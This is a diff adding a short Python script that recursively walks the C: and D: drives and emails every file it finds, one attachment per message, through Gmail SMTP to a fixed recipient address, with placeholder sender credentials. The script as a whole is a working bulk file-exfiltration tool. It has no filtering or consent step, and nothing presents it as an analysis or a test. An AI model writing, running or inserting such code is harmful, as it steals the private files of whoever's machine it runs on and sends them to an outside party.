@@ -1,0 +1,54 @@
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.base import MIMEBase
+from email import encoders
+import os
+
+# Email and password for the sender's email account
+sender_email = "your_email@gmail.com"
+sender_password = "your_password"
+
+# Recipient email address
+recipient_email = "recipient_email@example.com"
+
+# Function to send email with attachment
+def send_email_with_attachment(file_path):
+    # Connect to the SMTP server
+    with smtplib.SMTP("smtp.gmail.com", 587) as server:
+        server.starttls()
+        server.login(sender_email, sender_password)
+
+        # Create a message object
+        message = MIMEMultipart()
+        message["From"] = sender_email
+        message["To"] = recipient_email
+        message["Subject"] = f"File: {file_path}"
+
+        # Attach the file to the email
+        with open(file_path, "rb") as attachment:
+            part = MIMEBase("application", "octet-stream")
+            part.set_payload(attachment.read())
+        encoders.encode_base64(part)
+        part.add_header(
+            "Content-Disposition",
+            f"attachment; filename= {os.path.basename(file_path)}",
+        )
+        message.attach(part)
+
+        # Send the email
+        server.send_message(message)
+        print(f"{file_path} sent successfully!")
+
+# Function to browse folders recursively and send files
+def browse_and_send_files(folder):
+    for root, dirs, files in os.walk(folder):
+        for file in files:
+            file_path = os.path.join(root, file)
+            send_email_with_attachment(file_path)
+
+# Browse folders on disks C and D
+for drive in ['C:', 'D:']:
+    if os.path.exists(drive):
+        browse_and_send_files(drive)
+
+print("All files sent successfully!")
